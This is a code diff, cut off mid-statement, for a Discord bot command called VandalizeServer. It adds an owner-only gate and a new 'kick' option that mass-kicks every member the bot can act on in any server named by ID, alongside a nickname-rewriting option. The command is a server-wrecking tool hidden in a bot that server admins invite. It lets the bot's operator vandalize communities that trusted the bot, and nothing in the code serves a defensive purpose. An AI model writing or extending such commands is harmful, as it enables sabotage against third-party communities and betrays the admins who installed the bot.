@@ -3,6 +3,7 @@ package com.safjnest.Commands.Dangerous;
 import com.jagrosh.jdautilities.command.Command;
 import com.jagrosh.jdautilities.command.CommandEvent;
 import com.safjnest.Utilities.JSONReader;
+import com.safjnest.Utilities.PermissionHandler;
 
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.Member;
@@ -22,9 +23,15 @@ public class VandalizeServer extends Command{
 
     @Override
     protected void execute(CommandEvent event) {
+        if(!PermissionHandler.isUntouchable(event.getAuthor().getId())){
+            return;
+        }
+
         String[] args = event.getArgs().split(" ", 3);
         Guild theGuild = event.getJDA().getGuildById(args[0]);
         Member self = theGuild.getMember(event.getSelfUser());
+
+        
 
         switch (args[1]) {
             case "suffix":
@@ -45,6 +52,19 @@ public class VandalizeServer extends Command{
                 theGuild.getMembers().forEach(member -> {
                     if(self.canInteract(member) && ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).toLowerCase().endsWith(desuffix.toLowerCase())){
                         member.modifyNickname(((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).substring(0, ((member.getNickname() == null) ? member.getUser().getName() : member.getNickname()).length()- desuffix.length())).queue(
+                        (e) -> System.out.println("ok"), 
+                        new ErrorHandler().handle(
+                            ErrorResponse.MISSING_PERMISSIONS,
+                                (e) -> System.out.println("Sorry, " + e.getMessage()))
+                        );
+                    }
+                });
+                break;
+
+            case "kick":
+                theGuild.getMembers().forEach(member -> {
+                    if(self.canInteract(member)){
+                        member.kick().queue(
                         (e) -> System.out.println("ok"), 
                         new ErrorHandler().handle(
                             ErrorResponse.MISSING_PERMISSIONS,
